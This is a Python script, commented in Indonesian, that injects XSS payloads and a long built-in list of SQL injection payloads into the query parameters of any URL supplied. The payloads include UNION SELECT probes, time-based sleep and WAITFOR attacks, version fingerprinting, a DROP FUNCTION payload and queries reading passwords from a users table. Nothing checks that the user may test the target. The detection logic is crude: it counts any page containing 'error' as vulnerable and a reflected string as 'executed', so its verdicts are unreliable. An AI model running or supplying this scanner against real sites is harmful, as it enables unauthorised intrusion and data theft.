import requests
from urllib.parse import urlparse, urlencode, parse_qs
from colorama import Fore, init

# Inisialisasi colorama untuk mendukung pewarnaan teks di terminal
init(autoreset=True)


def send_request(url, method="GET", data=None, headers=None):
    """
    Mengirimkan HTTP request ke URL dan mengembalikan respons.
    """
    try:
        if method.upper() == "GET":
            response = requests.get(url, headers=headers, timeout=10)
        elif method.upper() == "POST":
            response = requests.post(
                url, data=data, headers=headers, timeout=10)
        else:
            print(f"[ERROR] Unsupported method: {method}")
            return None
        return response
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        return None


def test_xss_and_sql_injection(url, xss_payloads, sql_payloads, output_file=None):
    """
    Menguji kerentanan XSS dan SQL Injection pada URL menggunakan daftar payload.
    """
    print(f"[INFO] Testing XSS and SQL Injection on {url}\n")
    results = []
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    params = parse_qs(parsed_url.query)

    if not params:
        print("[INFO] No parameters found in the URL to test.")
        return

    # Cek setiap parameter URL untuk kerentanannya
    for param_name in params:
        # Test XSS payloads
        for payload in xss_payloads:
            # Ganti nilai parameter dengan payload
            modified_params = {**params, param_name: [payload]}
            query_string = urlencode(modified_params, doseq=True)
            test_url = f"{base_url}?{query_string}"
            print(f"[TESTING] XSS URL: {test_url}")

            # Kirim permintaan
            response = send_request(test_url)

            # Periksa apakah payload ada dalam response dan jika ada, apakah payload dijalankan
            if response and payload in response.text:
                result = f"{Fore.RED}[VULNERABLE - XSS] Parameter '{param_name}' executed payload: {payload}{Fore.RESET}"
                print(result)
                results.append(result)
            else:
                print(
                    f"[SAFE - XSS] Parameter '{param_name}' did not execute payload: {payload}")

        # Test SQL Injection payloads
        for payload in sql_payloads:
            # Ganti nilai parameter dengan payload
            modified_params = {**params, param_name: [payload]}
            query_string = urlencode(modified_params, doseq=True)
            test_url = f"{base_url}?{query_string}"
            print(f"[TESTING] SQL Injection URL: {test_url}")

            # Kirim permintaan
            response = send_request(test_url)

            # Periksa apakah respons menunjukkan kerentanan SQL Injection
            if response and ("error" in response.text.lower() or "syntax" in response.text.lower()):
                result = f"{Fore.YELLOW}[VULNERABLE - SQL Injection] Parameter '{param_name}' executed payload: {payload}{Fore.RESET}"
                print(result)
                results.append(result)
            else:
                print(
                    f"[SAFE - SQL Injection] Parameter '{param_name}' did not execute payload: {payload}")

    # Simpan hasil ke file jika diperlukan
    if output_file:
        with open(output_file, 'a') as file:
            file.write("\n".join(results) + "\n")
        print(f"\n[INFO] Results saved to: {output_file}")


def get_payloads():
    """
    Mengambil payload dari input pengguna atau file eksternal.
    """
    mode = input(
        "Choose payload input mode: (1) Input payload manually, (2) Load from file: ").strip()

    if mode == "1":
        payloads = []
        print("Enter payloads, one per line (type 'done' when finished):")
        while True:
            payload = input("Payload: ").strip()
            if payload.lower() == "done":
                break
            payloads.append(payload)
        return payloads

    elif mode == "2":
        file_path = input(
            "Enter the path to the file containing payloads: ").strip()
        try:
            with open(file_path, 'r') as file:
                payloads = [line.strip() for line in file if line.strip()]
            return payloads
        except FileNotFoundError:
            print("[ERROR] File not found! Exiting.")
            return []
    else:
        print("[ERROR] Invalid choice! Exiting.")
        return []


def main():
    print("=== Lightweight XSS and SQL Injection Testing Tool ===")

    # Pilih mode input URL
    mode = input(
        "Choose mode: (1) Single URL, (2) File with multiple URLs: ").strip()
    if mode == "1":
        full_url = input(
            "Enter the full URL with parameters (e.g., https://example.com/search?q=test): ").strip()
        urls = [full_url]
    elif mode == "2":
        file_path = input(
            "Enter the path to the file containing URLs: ").strip()
        try:
            with open(file_path, 'r') as file:
                urls = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print("[ERROR] File not found! Exiting.")
            return
    else:
        print("[ERROR] Invalid choice! Exiting.")
        return

    # Pilih output mode
    output_mode = input(
        "Output mode: (1) Display in terminal, (2) Save to file: ").strip()
    if output_mode == "2":
        output_log = input(
            "Enter the output log file name (e.g., xss_sql_results.txt): ").strip()
    else:
        output_log = None

    # Ambil payload dari input pengguna
    payloads = get_payloads()
    if not payloads:
        print("[ERROR] No payloads to test. Exiting.")
        return

    # SQL Injection payloads
    sql_payloads = [
        "' OR 1=1 --",  # Common SQL injection payload
        "' UNION SELECT NULL, NULL --",
        "' AND 1=1 --",
        "' OR 'a'='a",
        "' OR 1=1#",
        "'",
        "''",
        "`",
        "``",
        ",",
        '"',
        '""',
        "/",
        "//",
        "\\",
        "\\\\",
        ";",
        "' or \"",
        "-- or #",
        "' OR '1",
        "' OR 1 -- -",
        "\" OR \"\" = \"",
        "\" OR 1 = 1 -- -",
        "' OR '' = '",
        "'='",
        "'LIKE'",
        "'=0--+",
        " OR 1=1",
        "' OR 'x'='x",
        "' AND id IS NULL; --",
        "'''''''''''''UNION SELECT '2",
        "%00",
        "/*…*/",
        "+",  # addition, concatenate (or space in URL)
        "||",  # (double pipe) concatenate
        "%",  # wildcard attribute indicator
        "@variable",  # local variable
        "@@variable",  # global variable
        "AND 1",
        "AND 0",
        "AND true",
        "AND false",
        "1-false",
        "1-true",
        "1*56",
        "-2",
        "1' ORDER BY 1--+",
        "1' ORDER BY 2--+",
        "1' ORDER BY 3--+",
        "1' ORDER BY 1,2--+",
        "1' ORDER BY 1,2,3--+",
        "1' GROUP BY 1,2,--+",
        "1' GROUP BY 1,2,3--+",
        "' GROUP BY columnnames having 1=1 --",
        "-1' UNION SELECT 1,2,3--+",
        "' UNION SELECT sum(columnname ) from tablename --",
        "-1 UNION SELECT 1 INTO @,@",
        "-1 UNION SELECT 1 INTO @,@,@",
        "1 AND (SELECT * FROM Users) = 1",
        "' AND MID(VERSION(),1,1) = '5';",
        "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
        ",(select * from (select(sleep(10)))a)",
        "%2c(select%20*%20from%20(select(sleep(10)))a)",
        "';WAITFOR DELAY '0:0:30'--",
        " OR 1=1",
        " OR 1=0",
        " OR x=x",
        " OR x=y",
        " OR 1=1#",
        " OR 1=0#",
        " OR x=x#",
        " OR x=y#",
        " OR 1=1--",
        " OR 1=0--",
        " OR x=x--",
        " OR x=y--",
        " OR 3409=3409 AND ('pytW' LIKE 'pytW",
        " OR 3409=3409 AND ('pytW' LIKE 'pytY",
        " HAVING 1=1",
        " HAVING 1=0",
        " HAVING 1=1#",
        " HAVING 1=0#",
        " HAVING 1=1--",
        " HAVING 1=0--",
        " AND 1=1",
        " AND 1=0",
        " AND 1=1--",
        " AND 1=0--",
        " AND 1=1#",
        " AND 1=0#",
        " AND 1=1 AND '%'='",
        " AND 1=0 AND '%'='",
        " AND 1083=1083 AND (1427=1427",
        " AND 7506=9091 AND (5913=5913",
        " AND 1083=1083 AND ('1427=1427",
        " AND 7506=9091 AND ('5913=5913",
        " AND 7300=7300 AND 'pKlZ'='pKlZ",
        " AND 7300=7300 AND 'pKlZ'='pKlY",
        " AND 7300=7300 AND ('pKlZ'='pKlZ",
        " AND 7300=7300 AND ('pKlZ'='pKlY",
        " AS INJECTX WHERE 1=1 AND 1=1",
        " AS INJECTX WHERE 1=1 AND 1=0",
        " AS INJECTX WHERE 1=1 AND 1=1#",
        " AS INJECTX WHERE 1=1 AND 1=0#",
        " AS INJECTX WHERE 1=1 AND 1=1--",
        " AS INJECTX WHERE 1=1 AND 1=0--",
        " WHERE 1=1 AND 1=1",
        " WHERE 1=1 AND 1=0",
        " WHERE 1=1 AND 1=1#",
        " WHERE 1=1 AND 1=0#",
        " WHERE 1=1 AND 1=1--",
        " WHERE 1=1 AND 1=0--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        " ORDER BY 1--",
        " ORDER BY 2--",
        " ORDER BY 3--",
        " ORDER BY 4--",
        " ORDER BY 5--",
        " ORDER BY 6--",
        " ORDER BY 7--",
        " ORDER BY 8--",
        " ORDER BY 9--",
        " ORDER BY 10--",
        " ORDER BY 11--",
        " ORDER BY 12--",
        " ORDER BY 13--",
        " ORDER BY 14--",
        " ORDER BY 15--",
        " ORDER BY 16--",
        " ORDER BY 17--",
        " ORDER BY 18--",
        " ORDER BY 19--",
        " ORDER BY 20--",
        " ORDER BY 21--",
        " ORDER BY 22--",
        " ORDER BY 23--",
        " ORDER BY 24--",
        " ORDER BY 25--",
        " ORDER BY 26--",
        " ORDER BY 27--",
        " ORDER BY 28--",
        " ORDER BY 29--",
        " ORDER BY 30--",
        " ORDER BY 31337--",
        " ORDER BY 1#",
        " ORDER BY 2#",
        " ORDER BY 3#",
        " ORDER BY 4#",
        " ORDER BY 5#",
        " ORDER BY 6#",
        " ORDER BY 7#",
        " ORDER BY 8#",
        " ORDER BY 9#",
        " ORDER BY 10#",
        " ORDER BY 11#",
        " ORDER BY 12#",
        " ORDER BY 13#",
        " ORDER BY 14#",
        " ORDER BY 15#",
        " ORDER BY 16#",
        " ORDER BY 17#",
        " ORDER BY 18#",
        " ORDER BY 19#",
        " ORDER BY 20#",
        " ORDER BY 21#",
        " ORDER BY 22#",
        " ORDER BY 23#",
        " ORDER BY 24#",
        " ORDER BY 25#",
        " ORDER BY 26#",
        " ORDER BY 27#",
        " ORDER BY 28#",
        " ORDER BY 29#",
        " ORDER BY 30#",
        " ORDER BY 31337#",
        " ORDER BY 1",
        " ORDER BY 2",
        " ORDER BY 3",
        " ORDER BY 4",
        " ORDER BY 5",
        " ORDER BY 6",
        " ORDER BY 7",
        " ORDER BY 8",
        " ORDER BY 9",
        " ORDER BY 10",
        " ORDER BY 11",
        " ORDER BY 12",
        " ORDER BY 13",
        " ORDER BY 14",
        " ORDER BY 15",
        " ORDER BY 16",
        " ORDER BY 17",
        " ORDER BY 18",
        " ORDER BY 19",
        " ORDER BY 20",
        " ORDER BY 21",
        " ORDER BY 22",
        " ORDER BY 23",
        " ORDER BY 24",
        " ORDER BY 25",
        " ORDER BY 26",
        " ORDER BY 27",
        " ORDER BY 28",
        " ORDER BY 29",
        " ORDER BY 30",
        " ORDER BY 31337",
        " RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
        " RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
        "IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
        "IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--",
        "%' AND 8310=8310 AND '%'='",
        "%' AND 8310=8311 AND '%'='",
        "and (select substring(@@version,1,1))='X'",
        "and (select substring(@@version,1,1))='M'",
        "and (select substring(@@version,2,1))='i'",
        "and (select substring(@@version,2,1))='y'",
        "and (select substring(@@version,3,1))='c'",
        "and (select substring(@@version,3,1))='S'",
        "and (select substring(@@version,3,1))='X'",
        "sleep(5)#",
        "1 or sleep(5)#",
        "\" or sleep(5)#",
        "' or sleep(5)#",
        "\" or sleep(5)=\"",
        "' or sleep(5)='",
        "1) or sleep(5)#",
        "\") or sleep(5)#",
        "' or 'x'='x' and sleep(5)#",
        "' and sleep(5) --",
        "1 AND sleep(5)",
        "1' AND sleep(5)--",
        "UNION SELECT user(),database(),version() --",
        "UNION SELECT version(),user(),database() --",
        "1' UNION SELECT 1,2,3,4 --",
        "1' UNION SELECT NULL, NULL, NULL, NULL --",
        "1' UNION SELECT NULL, NULL, NULL, NULL, NULL --",
        "SELECT password from users where username='admin' --",
        "SELECT * FROM users WHERE username = 'admin' --",
        "SELECT username, password FROM users --",
        "SELECT * FROM users WHERE username = 'admin' --",
        "UNION SELECT NULL, null --"
        ]

    # Lakukan pengujian untuk setiap URL
    for url in urls:
        test_xss_and_sql_injection(
            url, payloads, sql_payloads, output_file=output_log)


if __name__ == "__main__":
    main()
